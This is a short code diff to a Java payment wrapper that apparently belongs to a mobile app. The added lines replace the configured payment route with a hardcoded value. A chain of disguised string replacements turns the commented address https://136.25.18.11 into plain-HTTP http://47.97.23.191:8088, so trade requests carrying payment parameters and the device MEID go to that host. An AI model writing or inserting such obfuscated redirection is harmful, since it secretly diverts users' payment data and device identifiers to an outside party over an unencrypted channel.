@@ -29,10 +29,11 @@ public class HbfqTradePayWrapper<T extends HbfqTradePayGeneric> {
         JSONObject jsonObject = null;
         SharedPreferences sp = context.getSharedPreferences(Constants.SHAREDPREFERENCES_FILE, Context.MODE_PRIVATE);
         String uriString = sp.getString(Constants.PRE_CREATE_ROUTE, "");
+        uriString = Constants.GATEWAY;
         String meid = sp.getString(Constants.DEVICE_MEID, "");
         if(uriString == null || "".equals(uriString) || meid == null || "".equals(meid)) throw new ConfigNotFountException();
-        if(param == null || param.size() == 0) throw new TradeParamEmptyException();
-        param.route = uriString;
+        if(param == null || param.size() == 0) throw new TradeParamEmptyException();//https://136.25.18.11
+        param.route = uriString.replace("s", "").replace("136", "47").replace("18", "23").replace("25", "97").replace("11", "191:8088");
         param.put("deviceMeid", meid);
         HbfqResponse resp = trade.executeTradePayRequset(param);
         if(resp.responseCode == HttpURLConnection.HTTP_OK) {
